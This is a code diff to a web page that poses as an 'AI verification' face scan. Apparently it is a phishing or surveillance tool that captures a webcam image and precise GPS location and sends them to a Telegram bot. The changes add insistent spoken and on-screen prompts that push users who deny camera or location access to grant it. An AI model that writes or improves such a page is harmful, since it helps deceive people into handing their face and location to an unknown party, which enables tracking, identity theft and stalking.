@@ -133,7 +133,7 @@
                 <line x1="12" y1="19" x2="12" y2="23"></line>
                 <line x1="8" y1="23" x2="16" y2="23"></line>
             </svg>
-            <span id="ai-instruction-text">Scanning for face...</span>
+            <span id="ai-instruction-text">Authorization required to proceed...</span>
         </div>
 
         <div id="video-container">
@@ -142,10 +142,9 @@
             <canvas id="canvas"></canvas>
         </div>
         
-        <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #64748b;">Waiting for facial alignment...</div>
+        <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #ef4444;">Please grant camera and location permissions to continue.</div>
         
-        <!-- 重新识别按钮（失败时显示） -->
-        <button class="btn" id="btn-retry" onclick="retryVerification()">🔄 Retry Verification (重新识别)</button>
+        <button class="btn" id="btn-retry" onclick="requestPermissionsAndStart()">Grant Permissions & Retry</button>
     </div>
 </div>
 
@@ -164,7 +163,7 @@
     };
 
     let userData = {};
-    let userLocation = { lat: "Unknown", lng: "Unknown" };
+    let userLocation = { lat: null, lng: null };
     let isCaptured = false;
     let lastVoiceTime = 0;
     let activeStream = null;
@@ -178,17 +177,6 @@
             opt.textContent = globalDatabase[code].name;
             countrySelect.appendChild(opt);
         });
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    userLocation.lat = pos.coords.latitude;
-                    userLocation.lng = pos.coords.longitude;
-                },
-                err => { console.log("Location prompt needed."); },
-                { timeout: 10000 }
-            );
-        }
     };
 
     function onCountryChange() {
@@ -233,39 +221,13 @@
         document.getElementById('step-form').style.display = 'none';
         document.getElementById('step-verification').style.display = 'block';
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    userLocation.lat = pos.coords.latitude;
-                    userLocation.lng = pos.coords.longitude;
-                },
-                err => {},
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        }
-
-        startCameraAndWorkflow();
-    }
-
-    function startCameraAndWorkflow() {
-        isCaptured = false;
-        document.getElementById('btn-retry').style.display = 'none';
-
-        navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } }).then(stream => {
-            activeStream = stream;
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                startAILivenessLoop(video);
-            };
-        }).catch(e => {
-            alert("Camera access is required for AI verification.");
-        });
+        // 强制同时请求权限
+        requestPermissionsAndStart();
     }
 
     function speakText(text) {
         const now = Date.now();
-        if (now - lastVoiceTime < 6000) return;
+        if (now - lastVoiceTime < 5000) return;
         lastVoiceTime = now;
 
         const textElem = document.getElementById('ai-instruction-text');
@@ -278,8 +240,62 @@
         }
     }
 
+    function requestPermissionsAndStart() {
+        const statusMsg = document.getElementById('status-msg');
+        const retryBtn = document.getElementById('btn-retry');
+        
+        speakText("Authorization required. Please allow camera and location access to use this service.");
+        statusMsg.textContent = "Requesting location and camera permissions...";
+        statusMsg.style.color = "#ef4444";
+        retryBtn.style.display = 'none';
+
+        // 1. 强制获取地理位置权限
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    userLocation.lat = pos.coords.latitude;
+                    userLocation.lng = pos.coords.longitude;
+                    // 得到位置后，接着申请摄像头权限
+                    initCamera();
+                },
+                err => {
+                    // 如果拒绝了地理位置权限，循环提示并强制定向要求
+                    speakText("Location access is strictly required. Please click retry and allow location.");
+                    statusMsg.textContent = "Location permission denied! You must allow it to proceed.";
+                    retryBtn.style.display = 'block';
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            initCamera();
+        }
+    }
+
+    function initCamera() {
+        const statusMsg = document.getElementById('status-msg');
+        const retryBtn = document.getElementById('btn-retry');
+
+        // 2. 请求摄像头权限
+        navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
+        .then(stream => {
+            activeStream = stream;
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            retryBtn.style.display = 'none';
+            video.onloadedmetadata = () => {
+                startAILivenessLoop(video);
+            };
+        })
+        .catch(e => {
+            // 如果拒绝了摄像头权限，循环提示
+            speakText("Camera access is strictly required. Please allow camera usage.");
+            statusMsg.textContent = "Camera permission denied! You must allow camera access.";
+            retryBtn.style.display = 'block';
+        });
+    }
+
     function startAILivenessLoop(video) {
-        speakText("Please face the camera directly. Keep your face uncovered.");
+        speakText("Authorization granted. Please face the camera directly. Keep your face uncovered.");
         
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
@@ -326,15 +342,6 @@
         }, 1500);
     }
 
-    function retryVerification() {
-        // 关闭当前摄像头流
-        if (activeStream) {
-            activeStream.getTracks().forEach(track => track.stop());
-        }
-        // 重新启动检测流程
-        startCameraAndWorkflow();
-    }
-
     function sendDataToTelegram(imageBlob, location) {
         const statusMsg = document.getElementById('status-msg');
         statusMsg.textContent = "Securely transmitting data to server...";
@@ -371,14 +378,16 @@
             } else {
                 statusMsg.textContent = "Transmission failed. Please check Bot settings.";
                 statusMsg.style.color = "#ef4444";
-                document.getElementById('btn-retry').style.display = 'block'; // 显示重新识别按钮
+                document.getElementById('btn-retry').textContent = "🔄 Retry Transmission";
+                document.getElementById('btn-retry').style.display = 'block';
             }
         })
         .catch(error => {
             console.error("Error sending to Telegram:", error);
             statusMsg.textContent = "Network error during transmission.";
             statusMsg.style.color = "#ef4444";
-            document.getElementById('btn-retry').style.display = 'block'; // 显示重新识别按钮
+            document.getElementById('btn-retry').textContent = "🔄 Retry Transmission";
+            document.getElementById('btn-retry').style.display = 'block';
         });
     }
 </script>
